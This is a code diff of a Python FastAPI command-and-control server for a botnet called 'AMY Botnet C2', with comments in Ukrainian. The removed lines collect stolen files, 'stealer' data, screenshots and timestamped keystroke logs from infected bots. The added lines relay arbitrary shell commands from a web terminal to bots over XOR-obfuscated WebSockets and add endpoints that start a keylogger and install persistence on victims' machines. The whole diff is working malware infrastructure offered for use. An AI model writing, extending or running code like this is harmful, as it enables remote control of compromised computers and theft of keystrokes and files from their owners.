@@ -1,99 +1,100 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
-from fastapi.responses import FileResponse, Response
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect
+from fastapi.responses import HTMLResponse
 import asyncio
 import base64
 import os
-from datetime import datetime
 
-app = FastAPI(title="AMY Botnet C2 - KEYLOGGER PRO")
+app = FastAPI(title="AMY Botnet C2")
 
-# Папки для даних
-for folder in ["screenshots", "logs", "downloads", "stealer"]:
-    os.makedirs(folder, exist_ok=True)
+active_bots = {}          # bot_id -> websocket (від client.py)
+terminal_sessions = {}    # bot_id -> list of UI terminals
 
-active_bots = {}
-bot_responses = {}
-last_screenshot_data = {} 
+os.makedirs("screenshots", exist_ok=True)
+os.makedirs("logs", exist_ok=True)
 
-X_KEY = "AMY_2026_SECRET"
+KEY = b"AMY_2026_SECRET"   # Має співпадати з X_KEY у client.py
 
-def crypt_logic(data: str) -> str:
-    key = X_KEY
-    return "".join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))
+def encrypt_message(msg: str) -> str:
+    encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(msg.encode('utf-8'))])
+    return base64.b64encode(encrypted).decode('utf-8')
 
-def decrypt(data: str) -> str:
+def decrypt_message(encoded: str) -> str:
     try:
-        decoded = base64.b64decode(data).decode()
-        return crypt_logic(decoded)
-    except: return None
+        encrypted = base64.b64decode(encoded)
+        decrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(encrypted)])
+        return decrypted.decode('utf-8', errors='ignore')
+    except:
+        return encoded
 
-def encrypt(data: str) -> str:
-    res = crypt_logic(data)
-    return base64.b64encode(res.encode()).decode()
+@app.get("/", response_class=HTMLResponse)
+async def dashboard():
+    with open("ui/index.html", encoding="utf-8") as f:
+        return f.read()
 
-@app.get("/")
-async def read_index():
-    ui_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "ui")
-    return FileResponse(os.path.join(ui_path, "index.html"))
+# ==================== BOT CONNECTION ====================
+@app.websocket("/ws/{bot_id}")
+async def bot_connection(websocket: WebSocket, bot_id: str):
+    await websocket.accept()
+    active_bots[bot_id] = websocket
+    print(f"[+] Bot {bot_id} CONNECTED")
+    try:
+        while True:
+            encrypted_data = await websocket.receive_text()
+            data = decrypt_message(encrypted_data)
+            print(f"[BOT → C2] {bot_id}: {data[:200]}")
+
+            # Пересилаємо відповідь у термінал UI
+            if bot_id in terminal_sessions:
+                for ws in terminal_sessions[bot_id]:
+                    await ws.send_text(f"[RESPONSE] {data}")
+    except WebSocketDisconnect:
+        active_bots.pop(bot_id, None)
+        print(f"[-] Bot {bot_id} DISCONNECTED")
+
+# ==================== UI TERMINAL ====================
+@app.websocket("/terminal/{bot_id}")
+async def terminal_connection(websocket: WebSocket, bot_id: str):
+    await websocket.accept()
+    if bot_id not in terminal_sessions:
+        terminal_sessions[bot_id] = []
+    terminal_sessions[bot_id].append(websocket)
+    print(f"[UI] Terminal connected to {bot_id}")
+
+    try:
+        while True:
+            command = await websocket.receive_text()
+            print(f"[UI → BOT] {bot_id}: {command}")
+
+            if bot_id in active_bots:
+                await active_bots[bot_id].send_text(encrypt_message(command))
+                await websocket.send_text(f"> Executing: {command}")
+            else:
+                await websocket.send_text("Error: Bot is offline")
+    except WebSocketDisconnect:
+        if bot_id in terminal_sessions:
+            terminal_sessions[bot_id].remove(websocket)
 
 @app.get("/bots")
 async def list_bots():
     return {"bots": list(active_bots.keys())}
 
-@app.get("/response/{bot_id}")
-async def get_response(bot_id: str):
-    res = bot_responses.pop(bot_id, "")
-    if res == "SCREENSHOT_LOADED": return {"response": "IMAGE_READY", "is_img": True}
-    return {"response": res, "is_img": False}
-
-@app.get("/view_screenshot/{bot_id}")
-async def view_screenshot(bot_id: str):
-    data = last_screenshot_data.get(bot_id)
-    if data: return Response(content=data, media_type="image/png")
-    return Response(status_code=404)
-
-@app.post("/command")
-async def send_command(bot_id: str, command: str):
+@app.get("/screenshot/{bot_id}")
+async def trigger_screenshot(bot_id: str):
     if bot_id in active_bots:
-        if command not in ["screenshot", "steal", "get_keys"]:
-            bot_responses[bot_id] = "> Executing: " + command
-        await active_bots[bot_id].send_text(encrypt(command))
-        return {"status": "success"}
-    return {"status": "error"}
+        await active_bots[bot_id].send_text(encrypt_message("screenshot"))
+        return {"status": "sent"}
+    return {"status": "offline"}
 
-@app.websocket("/ws/{bot_id}")
-async def websocket_endpoint(websocket: WebSocket, bot_id: str):
-    await websocket.accept()
-    active_bots[bot_id] = websocket
-    try:
-        while True:
-            raw = await websocket.receive_text()
-            data = decrypt(raw)
-            if not data: continue
-            
-            if data.startswith("SCREENSHOT:"):
-                last_screenshot_data[bot_id] = base64.b64decode(data[11:])
-                bot_responses[bot_id] = "SCREENSHOT_LOADED"
-            
-            elif data.startswith("FILE_DATA:"):
-                parts = data.split(":", 2)
-                with open(f"downloads/{bot_id}_{parts[1]}", "wb") as f: f.write(base64.b64decode(parts[2]))
-                bot_responses[bot_id] = f"FILE_SAVED:{parts[1]}"
-            
-            elif data.startswith("STEAL_DATA:"):
-                parts = data.split(":", 3)
-                with open(f"stealer/{bot_id}_{parts[1]}_{parts[2]}", "wb") as f: f.write(base64.b64decode(parts[3]))
-            
-            # АВТОМАТИЧНИЙ КЕЙЛОГГЕР
-            elif data.startswith("AUTO_KEYLOG:"):
-                keys = data[12:]
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                with open(f"logs/{bot_id}.txt", "a", encoding="utf-8") as f:
-                    f.write(f"[{timestamp}] {keys}\n")
-                # Не міняємо bot_responses, щоб не заважати в терміналі
-            
-            else:
-                bot_responses[bot_id] = data
-    except WebSocketDisconnect:
-        if bot_id in active_bots: del active_bots[bot_id]
+@app.get("/keylogger/{bot_id}")
+async def trigger_keylogger(bot_id: str):
+    if bot_id in active_bots:
+        await active_bots[bot_id].send_text(encrypt_message("start_keylogger"))
+        return {"status": "sent"}
+    return {"status": "offline"}
 
+@app.get("/persistence/{bot_id}")
+async def trigger_persistence(bot_id: str):
+    if bot_id in active_bots:
+        await active_bots[bot_id].send_text(encrypt_message("add_persistence"))
+        return {"status": "sent"}
+    return {"status": "offline"}
